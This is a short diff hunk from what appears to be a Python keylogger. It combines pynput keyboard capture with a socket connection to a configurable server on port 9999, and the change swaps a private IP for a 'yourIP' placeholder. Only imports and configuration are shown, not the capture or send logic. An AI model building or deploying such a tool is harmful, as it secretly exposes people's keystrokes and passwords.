@@ -2,7 +2,7 @@ import socket
 from pynput import keyboard
 
 # === CONFIG ===
-SERVER_IP = '192.168.31.66'     # Change to your server IP
+SERVER_IP = 'yourIP'     # Change to your server IP
 SERVER_PORT = 9999
 
 # === Socket Setup ===
